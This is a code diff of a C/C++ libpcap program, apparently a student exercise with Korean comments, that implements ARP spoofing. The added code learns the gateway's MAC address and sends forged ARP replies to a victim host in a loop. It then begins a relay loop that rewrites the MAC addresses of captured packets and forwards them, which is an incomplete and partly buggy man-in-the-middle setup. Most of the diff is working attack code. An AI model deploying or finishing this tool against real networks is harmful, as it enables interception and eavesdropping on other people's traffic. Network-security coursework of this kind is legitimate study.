@@ -6,10 +6,10 @@ int getMyMac(u_char* myMac, char* _interface){
 
     strcpy(s.ifr_name, _interface);
     if(!ioctl(fd, SIOCGIFHWADDR, &s)){
-        //printf("\n");
+        // printf("\n");
         for(int i =0; i<6; i++){
             myMac[i] = s.ifr_addr.sa_data[i];
-            //printf("%x ", myMac[i]);
+            // printf("%x ", myMac[i]);
         }
     }
     return 1;
@@ -24,6 +24,14 @@ int isARP(const uint8_t* pck){
 
 int isRep(const uint8_t* pck){
     char OpIsRep = (pck[20]==0x00 && pck[21]==0x02);
+    if(OpIsRep){
+        return 1;
+    }
+    return 0;
+}
+
+int isReq(const uint8_t* pck){
+    char OpIsRep = (pck[20]==0x00 && pck[21]==0x01);
     if(OpIsRep){
         return 1;
     }
@@ -89,29 +97,36 @@ int main(int argc, char *argv[]) {
     const uint8_t* packet;
     u_char SenderMAC[6];
     u_char DstMAC[6];
+    u_char GateWayMac[6];
 
     arp_packet arp_data;
     arp_packet rec_pck;
-    arp_data.modifyTargetIP((u_char*)sender_ip);
-
     // 구조체화 시키기
     arp_data.modifySenderMAC(myMac);
+    arp_data.modifyTargetIP((u_char*)sender_ip);
 
     printf("---before sendpacket ---\n");
-    pcap_sendpacket(handle, (const u_char*) &(arp_data.data), 42);
+    pcap_sendpacket(handle, (const u_char*) &(arp_data.data), ARP_PCK_SIZE);
     while(true){
-        if(pcap_next_ex(handle, &header, &packet)==0){
+        if(pcap_next_ex(handle, &header, &packet)==0) {
             continue;
         }
-        rec_pck.initPacket((u_char*)packet);
+        if(isARP(packet) && isReq(packet)){
+            rec_pck.initPacket((u_char*)packet);
+            memcpy(GateWayMac, rec_pck.getSendMac(), MAC_SIZE);
+            // 수행시간 고려하여 if문 안에 둠
+            // GateWayMac 에 게이트웨이 MAC Address 저장
+        }
         if(isARP(packet) && isRep(packet)){
+            // arp reply 패킷 잡음 - Sender MAC을 알아냄
+            rec_pck.initPacket((u_char*)packet);
             printf("Caught ARP-Reply packet\n");
+
+            memcpy(SenderMAC, rec_pck.getSendMac(), MAC_SIZE);
+            memcpy(DstMAC, rec_pck.getDstMac(), MAC_SIZE);
             break;
         }
     }
-
-    memcpy(SenderMAC, rec_pck.getSendMac(), MAC_SIZE);
-    memcpy(DstMAC, rec_pck.getDstMac(), MAC_SIZE);
 
     for(int i =0; i<6; i++){
         printf("%X ", SenderMAC[i]);
@@ -125,12 +140,37 @@ int main(int argc, char *argv[]) {
     arp_data.modifyETHDestination(SenderMAC);
 
     printf("Press ^c to Exit.\n");
-    while(true){
+    for(int i =0;i<30;i++){
         //arp reply패킷 전송
-        pcap_sendpacket(handle, (const u_char*) &(arp_data.data), 42);
+            pcap_sendpacket(handle, (const u_char*) &(arp_data.data), ARP_PCK_SIZE);
         printf("packet send\n");
         sleep(1);
+        //TODO sender가
     }
 
+    printf("Relay 패킷\n");
     //TODO relay packet 작성
+    while(true){
+        if(pcap_next_ex(handle, &header, &packet)==0){
+            continue;
+        }
+        rec_pck.initPacket((u_char*)packet);
+        pcap_sendpacket(handle, (const u_char*) &(arp_data.data), ARP_PCK_SIZE);
+
+        if(memcmp(sender_ip, rec_pck.getSendIP(), IP_SIZE)){
+           continue;
+        }
+
+        rec_pck.modifyETHSource(myMac);
+        rec_pck.modifyTargetMAC(GateWayMac);
+
+        pcap_sendpacket(handle, (const u_char*) &(rec_pck.data), sizeof(packet));
+
+
+        printf("\n---패킷보냄---\n");
+
+
+        //TODO 게이트웨이에서 보낸거 다시 받고 수정 거쳐서 sender에게 보낸다.
+        // 코드작성후 인터넷이 되는지로 확인
+    }
 }
